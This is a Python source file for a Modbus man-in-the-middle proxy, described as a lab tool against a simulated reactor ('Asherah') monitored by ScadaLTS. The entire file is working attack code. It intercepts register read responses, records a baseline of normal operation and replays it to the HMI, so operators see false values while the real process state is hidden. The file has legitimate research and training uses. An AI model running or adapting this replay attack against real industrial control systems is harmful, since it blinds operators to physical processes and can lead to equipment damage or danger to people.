#!/usr/bin/env python3
"""
Modbus Man-in-the-Middle with Replay capability.
Intended for controlled lab experiments against the Asherah simulator.

Architecture:
    ScadaLTS (172.20.0.30) <---> MITM (172.20.0.100) <---> Asherah (172.20.0.10)

Modes:
    - PASSTHROUGH : Transparent proxy (no modification)
    - RECORD      : Record normal traffic samples
    - REPLAY      : Replay previously recorded samples
"""

import socket
import threading
import time
import json
import argparse
from datetime import datetime
from pymodbus.client import ModbusTcpClient
from pymodbus.server import StartTcpServer
from pymodbus.datastore import ModbusSlaveContext, ModbusServerContext
from pymodbus.datastore import ModbusSequentialDataBlock
from pymodbus.device import ModbusDeviceIdentification

# Configuration
ASHERAH_IP = "172.20.0.10"
ASHERAH_PORT = 502
MITM_LISTEN_PORT = 5502

class ReplayAttack:
    """Manage recording and replay of Modbus samples."""
    
    def __init__(self, record_file="recorded_values.json"):
        self.record_file = record_file
        self.recorded_data = []
        self.recording = False
        self.replaying = False
        self.replay_index = 0
        self.replay_loop = True
        
    def start_recording(self):
        """Start recording samples."""
        self.recording = True
        self.recorded_data = []
        print(f"RECORDING started at {datetime.now()}")
        
    def stop_recording(self):
        """Stop recording and save to file."""
        self.recording = False
        self.save_recording()
        print(f"RECORDING stopped. {len(self.recorded_data)} samples saved.")
        
    def record_sample(self, registers, timestamp=None):
        """Record a single sample (list of register values)."""
        if not self.recording:
            return
            
        sample = {
            "timestamp": timestamp or time.time(),
            "datetime": datetime.now().isoformat(),
            "registers": registers
        }
        self.recorded_data.append(sample)
        
    def save_recording(self):
        """Save the recorded samples to a JSON file."""
        metadata = {
            "recorded_at": datetime.now().isoformat(),
            "duration_seconds": len(self.recorded_data) * 1.0,  # Assuming 1Hz
            "sample_count": len(self.recorded_data),
            "description": "Asherah reactor normal operation baseline"
        }
        
        data = {
            "metadata": metadata,
            "samples": self.recorded_data
        }
        
        with open(self.record_file, 'w') as f:
            json.dump(data, f, indent=2)
        print(f"Recording saved to {self.record_file}")
        
    def load_recording(self):
        """Load a recording from a JSON file."""
        try:
            with open(self.record_file, 'r') as f:
                data = json.load(f)
            self.recorded_data = data.get("samples", [])
            print(f"  Loaded {len(self.recorded_data)} samples from {self.record_file}")
            print(f"   Recorded at: {data['metadata']['recorded_at']}")
            print(f"   Duration: {data['metadata']['duration_seconds']}s")
            return True
        except FileNotFoundError:
            print(f" Recording file not found: {self.record_file}")
            return False
        except Exception as e:
            print(f" Error loading recording: {e}")
            return False
            
    def start_replay(self, loop=True):
        """Start replaying recorded samples."""
        if not self.recorded_data:
            print(" No recorded data to replay. Record first or load a file.")
            return False
        
        self.replaying = True
        self.replay_index = 0
        self.replay_loop = loop
        print(f"   REPLAY started. {'Looping' if loop else 'One-shot'}")
        return True
        
    def stop_replay(self):
        """Stop replaying samples."""
        self.replaying = False
        print(f"   REPLAY stopped at sample {self.replay_index}/{len(self.recorded_data)}")
        
    def get_replay_values(self):
        """Return the next set of register values to replay."""
        if not self.replaying or not self.recorded_data:
            return None
            
        sample = self.recorded_data[self.replay_index]
        self.replay_index += 1
        
        # Loop if requested
        if self.replay_index >= len(self.recorded_data):
            if self.replay_loop:
                self.replay_index = 0
                print("  Replay loop restarted")
            else:
                self.stop_replay()
                print("   Replay finished (no loop)")
                
        return sample["registers"]


class ModbusMITM:
    """Modbus Man-in-the-Middle proxy."""
    
    def __init__(self, target_ip, target_port, listen_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.listen_port = listen_port
        self.replay_attack = ReplayAttack()
        self.mode = "PASSTHROUGH"  # PASSTHROUGH, RECORD, REPLAY
        self.running = False
        
    def proxy_modbus_request(self, client_socket):
        """Proxy Modbus requests between ScadaLTS and Asherah."""
        try:
            # Connect to the real Asherah server
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((self.target_ip, self.target_port))
            
            while self.running:
                # Receive the request from the client (ScadaLTS)
                data = client_socket.recv(4096)
                if not data:
                    break
                
                # Send the request to the server (Asherah)
                server_socket.sendall(data)
                
                # Receive the response from the server
                response = server_socket.recv(4096)
                
                # === INTERCEPTION HERE ===
                modified_response = self.intercept_response(response)
                
                # Send the response (modified or not) to the client
                client_socket.sendall(modified_response)
                
        except Exception as e:
            print(f" Proxy error: {e}")
        finally:
            client_socket.close()
            server_socket.close()
            
    def intercept_response(self, response):
        """Intercept and optionally modify Modbus responses."""
        if len(response) < 9:
            return response  # Too short to be a valid Modbus response
        
        # Parse Modbus response (simplified)
        # Format: [Transaction ID (2)] [Protocol ID (2)] [Length (2)] [Unit ID (1)] [Function (1)] [Data...]
        transaction_id = response[0:2]
        protocol_id = response[2:4]
        length = int.from_bytes(response[4:6], 'big')
        unit_id = response[6]
        function_code = response[7]
        
        # We are interested in read responses (function 03 or 04)
        if function_code not in [0x03, 0x04]:
            return response
        
        byte_count = response[8]
        register_data = response[9:9+byte_count]
        
        # Convert into a list of 16-bit registers
        registers = []
        for i in range(0, len(register_data), 2):
            if i+1 < len(register_data):
                reg_value = int.from_bytes(register_data[i:i+2], 'big')
                registers.append(reg_value)
        
        # === MODE RECORD ===
        if self.mode == "RECORD":
            self.replay_attack.record_sample(registers)
            if len(self.replay_attack.recorded_data) % 10 == 0:
                print(f"  Recording... {len(self.replay_attack.recorded_data)} samples")
        
        # === MODE REPLAY ===
        elif self.mode == "REPLAY":
            replay_values = self.replay_attack.get_replay_values()
            if replay_values:
                # Rebuild Modbus response with the replayed values
                new_register_data = b''
                for val in replay_values[:len(registers)]:  # Same number of registers
                    new_register_data += val.to_bytes(2, 'big')

                # Rebuild the full response
                new_response = (
                    transaction_id +
                    protocol_id +
                    length.to_bytes(2, 'big') +
                    bytes([unit_id, function_code, byte_count]) +
                    new_register_data
                )

                if len(self.replay_attack.recorded_data) > 0:
                    progress = (self.replay_attack.replay_index / len(self.replay_attack.recorded_data)) * 100
                    if self.replay_attack.replay_index % 10 == 0:
                        print(f"   Replaying... {progress:.1f}%")

                return new_response
        
        # === MODE PASSTHROUGH (default) ===
        return response
    
    def start_server(self):
        """Start the proxy server and accept connections."""
        self.running = True
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', self.listen_port))
        server.listen(5)
        
        print(f"   MITM Server listening on 0.0.0.0:{self.listen_port}")
        print(f"   Proxying to {self.target_ip}:{self.target_port}")
        print(f"   Mode: {self.mode}")
        
        while self.running:
            try:
                client_socket, addr = server.accept()
                print(f"Connection from {addr}")
                thread = threading.Thread(target=self.proxy_modbus_request, args=(client_socket,))
                thread.daemon = True
                thread.start()
            except KeyboardInterrupt:
                break
        
        server.close()
        
    def set_mode(self, mode):
        """Change the operating mode."""
        valid_modes = ["PASSTHROUGH", "RECORD", "REPLAY"]
        if mode.upper() not in valid_modes:
            print(f" Invalid mode. Choose from {valid_modes}")
            return False
        
        self.mode = mode.upper()
        print(f"Mode changed to: {self.mode}")
        
        if self.mode == "RECORD":
            self.replay_attack.start_recording()
        elif self.mode == "REPLAY":
            if not self.replay_attack.start_replay():
                self.mode = "PASSTHROUGH"
                return False
        
        return True


def interactive_mode(mitm):
    """Interactive interface to control the MITM."""
    print("\n" + "="*60)
    print("  MODBUS MITM - Interactive Control")
    print("="*60)
    print("Commands:")
    print("  record       - Start recording normal operation")
    print("  stop         - Stop recording")
    print("  save         - Save recording to file")
    print("  load [file]  - Load recording from file")
    print("  replay       - Start replay attack")
    print("  passthrough  - Return to passthrough mode")
    print("  status       - Show current status")
    print("  quit         - Exit")
    print("="*60)
    
    while True:
        try:
            cmd = input("\nMITM> ").strip().lower()
            
            if cmd == "record":
                mitm.set_mode("RECORD")
            elif cmd == "stop":
                if mitm.mode == "RECORD":
                    mitm.replay_attack.stop_recording()
                    mitm.set_mode("PASSTHROUGH")
                elif mitm.mode == "REPLAY":
                    mitm.replay_attack.stop_replay()
                    mitm.set_mode("PASSTHROUGH")
            elif cmd == "save":
                mitm.replay_attack.save_recording()
            elif cmd.startswith("load"):
                parts = cmd.split()
                filename = parts[1] if len(parts) > 1 else "recorded_values.json"
                mitm.replay_attack.record_file = filename
                mitm.replay_attack.load_recording()
            elif cmd == "replay":
                mitm.set_mode("REPLAY")
            elif cmd == "passthrough":
                mitm.set_mode("PASSTHROUGH")
            elif cmd == "status":
                print(f"\nStatus:")
                print(f"   Mode: {mitm.mode}")
                print(f"   Recording: {mitm.replay_attack.recording}")
                print(f"   Replaying: {mitm.replay_attack.replaying}")
                print(f"   Samples recorded: {len(mitm.replay_attack.recorded_data)}")
                if mitm.replay_attack.replaying:
                    print(f"   Replay progress: {mitm.replay_attack.replay_index}/{len(mitm.replay_attack.recorded_data)}")
            elif cmd == "quit":
                mitm.running = False
                break
            else:
                print(" Unknown command")
                
        except KeyboardInterrupt:
            print("\n\nExiting...")
            mitm.running = False
            break
        except Exception as e:
            print(f" Error: {e}")


def main():
    parser = argparse.ArgumentParser(description="Modbus MITM with Replay Attack")
    parser.add_argument("--target", default=ASHERAH_IP, help="Target Modbus server IP")
    parser.add_argument("--target-port", type=int, default=ASHERAH_PORT, help="Target port")
    parser.add_argument("--listen-port", type=int, default=MITM_LISTEN_PORT, help="MITM listen port")
    parser.add_argument("--mode", choices=["passthrough", "record", "replay"], default="passthrough")
    parser.add_argument("--record-file", default="recorded_values.json", help="Recording file")
    parser.add_argument("--interactive", action="store_true", help="Interactive mode")
    
    args = parser.parse_args()
    
    # Create the MITM
    mitm = ModbusMITM(args.target, args.target_port, args.listen_port)
    mitm.replay_attack.record_file = args.record_file
    
    # Load a recording if in replay mode
    if args.mode == "replay":
        if not mitm.replay_attack.load_recording():
            print(" Cannot start replay without recorded data")
            return
    
    mitm.set_mode(args.mode)
    
    # Start the server in a thread
    server_thread = threading.Thread(target=mitm.start_server)
    server_thread.daemon = True
    server_thread.start()
    
    time.sleep(1)
    
    # Interactive mode or wait
    if args.interactive:
        interactive_mode(mitm)
    else:
        print("\nPress Ctrl+C to stop...")
        try:
            while mitm.running:
                time.sleep(1)
        except KeyboardInterrupt:
            if mitm.mode == "RECORD":
                mitm.replay_attack.stop_recording()
            print("\n\nStopping...")
            mitm.running = False
    
    print("MITM stopped")


if __name__ == "__main__":
    main()